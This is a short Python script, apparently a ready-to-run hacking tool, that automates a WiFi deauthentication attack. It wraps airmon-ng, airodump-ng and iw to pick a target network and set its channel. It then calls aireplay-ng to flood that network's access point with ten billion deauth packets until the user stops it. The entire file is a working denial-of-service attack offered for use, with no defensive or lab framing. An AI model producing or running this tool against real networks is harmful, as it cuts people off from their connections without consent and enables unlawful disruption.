import os
import time
import subprocess

cmd=os.system("clear")
def start_monitor_mode(interface):
    os.system(f"airmon-ng start {interface} && airmon-ng check kill")
    return interface

def scan_networks(monitor_iface):
    print("\n[+] Scanning for nearby WiFi networks (Press Ctrl+C to stop)...\n")
    time.sleep(2)
    os.system(f"airodump-ng {monitor_iface}")

def get_target_info():
    bssid = input("\nEnter BSSID of target network: ")
    channel = input("Enter Channel of target network: ")
    essid = input("Enter ESSID (Network Name) of target: ")
    return bssid, channel, essid

def set_channel(monitor_iface, channel):
    print(f"\n[+] Setting channel to {channel}...\n")
    os.system(f"iw dev {monitor_iface} set channel {channel}")

def start_deauth_attack(monitor_iface, bssid):
    print(f"\n[!] Launching Deauthentication attack on {bssid}...\n")
    # Send 10000000000 deauth packets
    return subprocess.Popen(["aireplay-ng", "--deauth", "10000000000", "-a", bssid, monitor_iface])

def main():
    os.system("clear")
    print("=== Deauthentication Attack ===")
    iface = input("Enter your wireless interface (e.g., wlan0): ")

    monitor_iface = start_monitor_mode(iface)

    scan_networks(monitor_iface)

    bssid, channel, essid = get_target_info()

    # Set the monitor mode interface to the target network's channel
    set_channel(monitor_iface, channel)

    # Start deauth attack in the background
    deauth_proc = start_deauth_attack(monitor_iface, bssid)

    input("\n[!] Deauth is running. Press Enter to stop the attack...\n")

    # Stop the deauth attack and terminate the process
    deauth_proc.terminate()
    print("[+] Deauth attack stopped.")
    command = f"airmon-ng stop {iface} && systemctl restart NetworkManager"
    result = os.system(command)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Script interrupted. Exiting...")
